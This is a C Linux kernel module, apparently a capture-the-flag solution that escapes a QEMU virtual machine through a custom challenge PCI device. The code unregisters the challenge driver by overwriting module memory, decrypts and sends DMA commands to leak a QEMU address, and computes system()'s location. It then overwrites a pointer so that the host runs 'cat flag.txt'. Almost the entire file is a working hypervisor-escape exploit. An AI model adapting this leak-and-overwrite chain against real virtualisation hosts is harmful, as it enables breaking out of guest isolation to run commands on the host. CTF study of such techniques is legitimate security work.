#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>
#include <linux/fs.h>
#include <linux/delay.h>
#include <linux/module.h>

static void __iomem* mmio;
static struct pci_dev* pci_device;

u64 dev_read(u64 off) {
    return *((u64*)(mmio+off));
}
void dev_write(u64 off, u32 val) {
    *((u64*)(mmio+off)) = val;
}

static irqreturn_t interrupt_handler(int irq, void *cookie)
{
   (void) cookie;
   printk("[+] Handle IRQ #%d\n", irq);
   return IRQ_HANDLED;
}

int pci_probe(struct pci_dev* dev, const struct pci_device_id* id) {
    int ret;

    printk(KERN_INFO "[+] pci_probe called\n");
    ret = pci_enable_device(dev);
    if (ret < 0) {
        printk(KERN_INFO "[x] failed to enable pci device\n");
        return ret;
    }
    printk(KERN_INFO "[+] pci device enabled\n");

    pci_device = dev;

    ret = pci_request_region(dev, 0, "ss-mmio");
    if (ret) {
        printk(KERN_INFO "[x] failed to request region\n");
        return ret;
    }

    mmio = pci_iomap(dev, 0, 0);
    if (!mmio) {
        printk(KERN_INFO "[x] failed to map mmio\n");
        return -EFAULT;
    }
    printk(KERN_INFO "[+] mapped mmio %px\n", mmio);

    pci_set_master(dev);

    pci_alloc_irq_vectors_affinity(dev, 1LL, 1LL, 2LL, 0LL);
    int v5 = pci_irq_vector(dev, 0LL);
    int result = request_threaded_irq(v5, interrupt_handler, 0LL, 0LL, "ss", 0LL);

    return 0;
};

void pci_remove(struct pci_dev* dev) {
    printk(KERN_INFO "[+] removing pci device\n");
    pci_release_region(dev, 0);
};

#define QEMU_VENDOR_ID 0x1234
#define CTF_DEVICE_ID 0x7373
static struct pci_device_id pci_ids[] = {
    {PCI_DEVICE(QEMU_VENDOR_ID, CTF_DEVICE_ID)},
    {0,}
};
MODULE_DEVICE_TABLE(pci, pci_ids);

static struct pci_driver pci_driver = {
    .name = "ctf_scsi_driver",
    .id_table = pci_ids,
    .probe = pci_probe,
    .remove = pci_remove
};

void decrypt_buf(u64* buf) {
    int i;
    u64 tmp, L, R;
    for (i = 0; i < 512; i += 2) {
        unsigned rounds = 16;
        L = buf[i];
        R = buf[i + 1];
        do {
            tmp = R;
            R = L ^ ((R >> 57) ^ 0x39 | (R << 7) ^ 0xB8379839B8379800uLL);
            L = tmp;
            --rounds;
        } while(rounds);
        buf[i] = R;
        buf[i+1] = L;
    }
}

void exploit(void) {
    u64 out = dev_read(0);
    printk(KERN_INFO "[x] %llx\n", out);

    dma_addr_t dma_handle;
    void *dma_buf = dma_alloc_coherent(&pci_device->dev, 0x1000, &dma_handle, GFP_KERNEL);
    u64* dma_buf64 = (u64*)dma_buf;

    printk(KERN_INFO "[x] DMA Handle - %llx\n", dma_handle);
    printk(KERN_INFO "[x] DMA Buf - %llx\n", dma_buf);

    // Write command to page 0
    strcpy(dma_buf, "cat flag.txt");
    decrypt_buf(dma_buf64);

    dev_write(24, 1);
    msleep(100);
    dev_write(24, 2);
    msleep(100);
    dev_write(32, 0x0);   // page_num
    msleep(100);
    dev_write(40, dma_handle);   // page_num
    msleep(100);
    dev_write(24, 0x13);   // do dma write
    msleep(500);

    // Get leaks
    dev_write(24, 1);
    msleep(100);
    dev_write(24, 2);
    msleep(100);
    dev_write(32, 0x100);   // page_num
    msleep(100);
    dev_write(40, dma_handle);   // page_num
    msleep(100);
    dev_write(24, 0x23);   // do dma read

    msleep(500);
    printk(KERN_INFO "[x] DMA Res - %llx\n", dev_read(16));

    decrypt_buf(dma_buf64);
 
    int i;
    for (i = 0; i < 0x10; i++) {
        printk(KERN_INFO "[x] DMA Out - %llx\n", dma_buf64[i]);
    }

    u64 qemu_base = dma_buf64[0] - 0x4f08a0;
    u64 system_addr = qemu_base + 0x2B9300;

    // Write System
    dma_buf64[2] = system_addr;
    decrypt_buf(dma_buf64);

    dev_write(24, 1);
    dev_write(24, 1);
    msleep(100);
    dev_write(24, 2);
    msleep(100);
    dev_write(32, 0x100);   // page_num
    msleep(100);
    dev_write(40, dma_handle);   // page_num
    msleep(100);
    dev_write(24, 0x13);   // do dma write
    msleep(500); 
    printk(KERN_INFO "[x] DMA Res - %llx\n", dev_read(16));

    // Do Sice
    dev_write(24, 1);
    msleep(100);
    dev_write(24, 2);
    msleep(100);
    dev_write(32, 0x0);   // page_num
    msleep(100);
    dev_write(40, dma_handle);   // page_num
    msleep(100);
    dev_write(24, 0x13);   // do dma write

    dma_free_coherent(&pci_device->dev, 0x1000, dma_buf, dma_handle);
}

static int __init ctf_driver_init(void) {
    int ret;

    printk(KERN_INFO "[+] initializing ctf pci driver...\n");

    struct module *mod;

    mutex_lock(&module_mutex);
    mod = find_module("ss");
    mutex_unlock(&module_mutex);

    printk(KERN_INFO "[+] module %lx\n", mod->core_layout.base);

    u64 data_sec = (u64)mod->core_layout.base + 0x2000;
    pci_unregister_driver((struct pci_driver*)data_sec);

    printk(KERN_INFO "[+] module confirm %lx\n", *(u64*)(data_sec + 0x20));

    ret = pci_register_driver(&pci_driver);
    if (ret) {
        printk(KERN_INFO "[x] failed to load ctf pci driver\n");
        return -ENOMEM;
    }
    printk(KERN_INFO "[+] loaded ctf pci driver\n");

    exploit();

    return 0;
}

static void __exit ctf_driver_exit(void) {
    pci_unregister_driver(&pci_driver);
    printk(KERN_INFO "[+] unloaded ctf pci driver\n");
}

module_init(ctf_driver_init);
module_exit(ctf_driver_exit);

MODULE_LICENSE("GPL");
